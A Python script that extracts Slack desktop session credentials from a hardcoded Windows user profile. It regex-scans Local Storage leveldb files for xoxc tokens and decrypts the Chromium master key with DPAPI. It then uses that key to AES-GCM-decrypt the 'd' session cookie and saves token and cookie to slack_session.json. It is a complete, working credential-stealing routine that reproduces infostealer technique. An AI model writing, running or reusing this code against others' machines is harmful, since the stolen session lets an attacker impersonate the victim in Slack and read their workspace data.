import os, sys, glob, re, sqlite3, shutil, tempfile, json, base64
import ctypes
from ctypes import wintypes

sys.stdout.reconfigure(encoding='utf-8')

base = r'C:\Users\Shestirukiy\AppData\Local\Packages\com.tinyspeck.slackdesktop_8yrtsj140pw4g\LocalCache\Roaming\Slack'

# 1. Extract xoxc token from Local Storage
ls_dir = os.path.join(base, 'Local Storage', 'leveldb')
xoxc_tokens = []
if os.path.exists(ls_dir):
    for f in os.listdir(ls_dir):
        fp = os.path.join(ls_dir, f)
        if os.path.isfile(fp):
            try:
                with open(fp, 'rb') as fh:
                    content = fh.read().decode('latin1', errors='ignore')
                    tokens = re.findall(r'xoxc-[0-9A-Za-z\-]+', content)
                    for t in tokens:
                        if t not in xoxc_tokens:
                            xoxc_tokens.append(t)
            except Exception:
                pass

print(f"Found {len(xoxc_tokens)} xoxc tokens.")

# 2. Extract d cookie from Cookies DB
cookie_path = os.path.join(base, 'Network', 'Cookies')
if not os.path.exists(cookie_path):
    cookie_path = os.path.join(base, 'Cookies')

print('Cookie path:', cookie_path)

# Windows DPAPI decrypt
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), ctypes.POINTER(ctypes.c_byte)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = ctypes.string_at(pbData, cbData)
        ctypes.windll.kernel32.LocalFree(pbData)
        return buffer
    return None

# Check Local State for AES key (if v10 / Chromium 80+)
local_state_path = os.path.join(base, 'Local State')
aes_key = None
if os.path.exists(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        ls_data = json.load(f)
        enc_key_b64 = ls_data.get('os_crypt', {}).get('encrypted_key')
        if enc_key_b64:
            enc_key = base64.b64decode(enc_key_b64)[5:] # strip 'DPAPI'
            aes_key = decrypt_dpapi(enc_key)
            print('Decrypted AES master key! Len:', len(aes_key) if aes_key else 0)

try:
    from Crypto.Cipher import AES
except ImportError:
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        AES = None
    except ImportError:
        AES = None

def decrypt_cookie_val(enc_val):
    if not enc_val:
        return ""
    if enc_val.startswith(b'v10') or enc_val.startswith(b'v11'):
        if not aes_key:
            return ""
        nonce = enc_val[3:15]
        ciphertext_with_tag = enc_val[15:]
        if AES:
            ciphertext = ciphertext_with_tag[:-16]
            tag = ciphertext_with_tag[-16:]
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
        else:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(aes_key)
            return aesgcm.decrypt(nonce, ciphertext_with_tag, None).decode('utf-8', errors='ignore')
    else:
        dec = decrypt_dpapi(enc_val)
        return dec.decode('utf-8', errors='ignore') if dec else ""

d_cookie_val = None
if os.path.exists(cookie_path):
    tmp = tempfile.mktemp()
    shutil.copy2(cookie_path, tmp)
    conn = sqlite3.connect(tmp)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value, encrypted_value FROM cookies WHERE name = 'd'")
    row = cursor.fetchone()
    if row:
        name, val, enc_val = row
        if val:
            d_cookie_val = val
        elif enc_val:
            try:
                d_cookie_val = decrypt_cookie_val(enc_val)
            except Exception as e:
                print('Error decrypting cookie:', e)
        print('d cookie found! Length:', len(d_cookie_val) if d_cookie_val else 0)
    conn.close()
    try:
        os.remove(tmp)
    except Exception:
        pass

if xoxc_tokens and d_cookie_val:
    with open('slack_session.json', 'w', encoding='utf-8') as f:
        json.dump({'xoxc': xoxc_tokens[0], 'd_cookie': d_cookie_val}, f)
    print("Saved valid session to slack_session.json!")
